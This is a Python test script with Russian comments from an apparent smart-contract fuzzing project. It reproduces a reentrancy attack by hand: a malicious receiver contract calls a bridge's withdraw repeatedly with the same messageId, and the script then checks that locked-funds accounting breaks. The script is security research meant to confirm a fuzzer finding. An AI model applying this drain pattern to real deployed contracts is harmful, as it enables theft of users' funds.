"""
test_bridge_manual.py — ручная проверка бага БЕЗ участия LLM.

Смысл: прежде чем доверять фаззеру находку, стоит один раз руками
воспроизвести атаку и убедиться что баг реальный, а не артефакт
неправильно написанного execute_scenario(). Это тот же принцип что
был в Фазе 2 с test_deploy.py.

Сценарий:
  1. attacker делает deposit(2000)
  2. attacker_contract настраивается на 3 реентрантных вызова withdraw
     с тем же messageId и amount=1000
  3. attacker (как валидатор) вызывает withdraw(attacker_contract, 1000, m1)
  4. Ожидание: attacker_contract получит ETH несколько раз за счёт
     реентранси, totalLocked уйдёт в нестыковку с реальным балансом.

Запуск:
    source venv/bin/activate
    python test_bridge_manual.py
"""

from fuzzer_bridge import (
    w3, ATTACKER, deploy_bridge_and_attacker, check_invariants, new_message_id
)

def main():
    bridge, attacker_contract = deploy_bridge_and_attacker("contracts/SimpleBridge.sol")
    print(f"Bridge deployed at: {bridge.address}")
    print(f"MaliciousReceiver deployed at: {attacker_contract.address}")

    # 1. deposit
    bridge.functions.deposit().transact({"from": ATTACKER, "value": 2000})
    print(f"После deposit(2000): totalLocked={bridge.functions.totalLocked().call()}, "
          f"ETH на мосту={w3.eth.get_balance(bridge.address)}")

    # 2. настройка атаки
    message_id = new_message_id()
    attacker_contract.functions.setAttackParams(message_id, 1000, 3).transact({"from": ATTACKER})

    # 3. запуск withdraw -> должен триггернуть reentrancy через receive()
    tx = bridge.functions.withdraw(attacker_contract.address, 1000, message_id).transact({"from": ATTACKER})
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print(f"withdraw tx status: {receipt['status']} (1 = success)")

    # 4. проверка результата
    total_locked  = bridge.functions.totalLocked().call()
    eth_on_bridge = w3.eth.get_balance(bridge.address)
    reentry_count = attacker_contract.functions.reentryCount().call()

    print(f"\nПосле атаки:")
    print(f"  reentryCount (сколько раз receive() дёрнул withdraw повторно) = {reentry_count}")
    print(f"  totalLocked (учёт по контракту) = {total_locked}")
    print(f"  реальный ETH на мосту           = {eth_on_bridge}")
    print(f"  ETH получено attacker_contract  = {w3.eth.get_balance(attacker_contract.address)}")

    violations = check_invariants(bridge)
    if violations:
        print("\n🚨 ИНВАРИАНТ НАРУШЕН:")
        for v in violations:
            print(f"   {v}")
    else:
        print("\n⚠️ Инвариант устоял — reentrancy не сработала как ожидалось, нужно дебажить контракт/скрипт.")

if __name__ == "__main__":
    main()